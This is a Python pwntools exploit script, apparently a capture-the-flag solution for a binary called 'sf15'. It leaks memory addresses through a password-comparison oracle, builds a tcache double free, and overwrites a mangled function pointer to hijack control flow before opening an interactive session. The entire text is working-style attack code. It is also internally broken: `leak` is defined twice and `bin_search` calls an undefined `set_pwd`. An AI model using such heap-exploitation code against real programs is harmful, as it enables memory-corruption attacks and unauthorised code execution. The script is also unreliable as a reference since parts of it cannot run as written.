from pwn import*
p = process('./sf15')
t = 0.05

### defintion
def ROL(data, shift, size=64):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)

def menu(sel):
    p.sendafter('>> ',str(sel))

def invite(name,description,flag,job):
    menu(1)
    p.sendafter('name : ',name)
    p.sendafter('description : ',description)
    if flag == 'y':
        p.sendafter('(y/n) : ',flag)
        p.sendlineafter('job name : ',job)
    else:
        p.sendafter('(y/n) : ',flag)

def kick(name):
    menu(2)
    p.sendlineafter('who is annoying you : ',name)


def manage(name,sel,job):
    menu(3)
    p.sendafter('who want to manage : ',name)
    for i in job:
        menu(sel)
        p.sendlineafter('job name : ',i)
    menu(3)

def password(password):
    menu(4)
    p.sendafter('password : ',password)

def leak(num,_len):
    res = ''
    tmp = 0x0
    password('X'*_len)
    while len(res) != 6:  
        password('X'*_len+res+p8(tmp))
        p.recvuntil('password is ')
        recv = p.recvuntil('!')
        if recv == 'small!':
            res += p8(tmp)
            tmp = 0x0
        else :
            tmp += 0x1
    res = u64(res.ljust(8,'\x00'))
    log.info('Leak {} : {}'.format(num,hex(res)))
    return res

# ===== ===== ===== ===== ===== ===== ===== #

def bin_search(low, high, first_pwd, prev_mid):
    mid=(low + high) / 2
    if mid == prev_mid:
        return mid
    dummy = first_pwd + p64(mid)
    if set_pwd(first_pwd + p64(mid),"a") < 0:               #real<mid
        return bin_search(low, mid - 1, first_pwd, mid)

    elif set_pwd(first_pwd + p64(mid),"a") > 0:             #real>mid
        return bin_search(mid + 1, high, first_pwd, mid)
    else:
        return mid

def leak(dummy):
    
    leak = 0
    for i in range(0,6):
        res = bin_search(0, 0xff, dummy, 0)
        leak += res << (8*i)
        dummy += p8(res)
    return leak

# ===== ===== ===== ===== ===== ===== ===== #

### exploit
PIE_base = 0x555555554000
# leak
password('X'*0xb8)
leak1 = leak('X'*0xb8)
leak2 = leak('X'*0xe0)

# tcache dup
invite('P'*0x8,'Q'*0x10,'y','p0'*0x8)
Job_P = ['p1'*0x8,'p2'*0x8,'p3'*0x8,'p4'*0x8]
manage('P'*0x8,1,Job_P)

invite('A'*0x8,'A'*0x10,'y','a0'*0x8)
Job_A = ['a1'*0x8,'a2'*0x8]
manage('A'*0x8,1,Job_A)

invite('B'*0x8,'B'*0x8,'n','')
invite('C'*0x8,'C'*0x8,'n','')
invite('D'*0x8,'D'*0x3f0+p64(leak1+0x10)[:7],'n','')
invite('E'*0x8,'E'*0x8,'n','')

Job_P.append('p0'*0x8)
manage('P'*0x8,2,Job_P)     # tcache bin dummy 5

Job_A = ['a1'*0x8,'a0'*0x8,'a0'*0x8]
manage('A'*0x8,2,Job_A)     # tcache double free a2->a1->a1

kick('E'*0x8)               # like consolidate

Job_B = ['b0'*0x8,'b1'*0x8,'b2'*0x8]
manage('B'*0x8,1,Job_B)

Job_C = [p64(leak1-0x68),p64(leak1-0x68)]
manage('C'*0x8,1,Job_C)

Job_D = [p64(leak1-0x68)]
Job_D.append(p64(leak1-0x68)+p64(ROL(PIE_base+0xC45,0x11))+p64(0)+p64(leak1)+p64(0x10000)[:7])
Job_D.append(p64(leak1+0x28))
manage('D'*0x8,1,Job_D)

password('X'*0x100)
menu(5)
raw_input()
pay = ''
pay += 'A'*0x21d0
#pay += 'B'*0xB
pay += p64(PIE_base+0xC32)
p.send(pay)
p.interactive()
# 0x555555758250 A
# 0x5555557586b0 C
# 0x555555758b10 E


